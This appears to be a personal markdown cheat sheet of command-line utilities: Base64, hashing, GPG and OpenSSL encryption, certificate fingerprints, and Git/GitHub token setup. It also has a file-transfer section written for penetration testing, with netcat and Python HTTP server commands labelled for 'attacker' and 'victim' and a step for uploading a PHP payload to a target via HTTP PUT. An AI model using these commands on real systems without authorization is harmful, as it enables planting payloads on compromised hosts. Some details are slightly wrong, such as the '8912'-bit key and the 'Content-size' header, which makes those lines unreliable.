# Utilities

[TOC]



### CyberChef - [URL](https://github.com/gchq/CyberChef)



### Base64

```bash
#Base64 encoding:
echo -n "admin:password" | base64

#Base64 decoding:
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
```



## Data Integrity - calculate Hashes 


```bash
# Linux Utilities
md5sum <data> 
sha1sum <data> 
sha256sum <data>

# OpenSSL
openssl sha256 <data>
openssl sha512 <data>
```



## Symmetric Encryption

### OpenPGP

```bash
# Encrypt a file (default symmetric cipher used is AES-128)
gpg -c --cipher-algo AES-256 --encrypt <data.txt> 
or
gpg --cipher-algo AES-256 --symmetric <data.txt> 

# Decrypt a file 
gpg -d <data.txt.gpg>
or
gpg --decrypt <data.txt.gpg>
```

### OpenSSL

```bash
# Encrypt a file (The method described uses a weak key derivation function. The ONLY security is introduced by a very strong password)
openssl aes-256-cbc -in <data.txt> -out <encrypted.enc>

# Encrypt a file - using a different encoding method of Base64 before storing the results in a file
openssl aes-256-cbc -a -in <data.txt> -out <encrypted.enc>

# Decrypt a file
openssl aes-256-cbc –a -d -in <encrypted.enc> -out <decrypted.txt>
```



## Asymmetric Encryption

### OpenSSL - Generate Certificate

```bash
# 1.Generate a private key (8912 creates the key 8912 bits long)
openssl genrsa -aes256 -out private.key 8912 

# 2.Generate a public key (use the private key)
openssl rsa -in private.key -pubout -out public.key 

# 3.Encrypt a file (plaintext.txt) using our public key
openssl rsautl -encrypt -pubin -inkey public.key -in <plaintext.txt> -out <encrypted.txt> 

# 4.Decrypt the file and get the original message using private key 
openssl rsautl -decrypt -inkey private.key -in <encrypted.txt> -out <plaintext.txt>
```

### OpenSSL - Verify Fingerprint
```bash
# Gather certificate
echo -n | openssl s_client -connect <website> | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > ./<cert_name>

# Extract and display Certificate fingertprint
openssl x509 -noout -in <cert_name> -fingerprint -sha1
```



## Transfer Files

### Using Netcat 

```bash
# On victim 
nc -l -p <port> > <filename> 

# On attacker 
nc -w -3 <machine_ip> <port> <  <filename> 

# Exploiting PUT 
wc -m <payload.php> (get the size) 
nc -v <target> 80 

PUT /payload.php HTTP/1.0 
Content-type: text/html 
Content-size: <size>
```



### Using Python 

```bash
# On the attacker 
python3 -m http.server <port>

# On the victim (One file)
wget http://<machine_ip:<port>/<filename>

# On the victim (Multiple file)
wget -r http://<machine_ip:<port>
```

 

 ### Git


git init
git branch -m "main"
git add .
git remote add origin https://github.com/f3nces/ReminderNotes.git
git commit -m "first commit"
git push -u origin main



git add --all
git commit -m 'another commit'
git push





 Create Personal Access Token on GitHub

From your GitHub account, go to Settings => Developer Settings => Personal Access Token => Generate New Token (Give your password) => Fillup the form => click Generate token => Copy the generated Token

or Linux, you need to configure the local GIT client with a username and email address,

$ git config --global user.name "your_github_username"
$ git config --global user.email "your_github_email"
$ git config -l

Once GIT is configured, we can begin using it to access GitHub. Example:


Username: <type your username>
Password: <type your password or personal access token (GitHub)

Now cache the given record in your computer to remembers the token:

$ git config --global credential.helper cache

If needed, anytime you can delete the cache record by:

$ git config --global --unset credential.helper
$ git config --system --unset credential.helper

git config --global --unset user.name
git config --global --unset user.email


 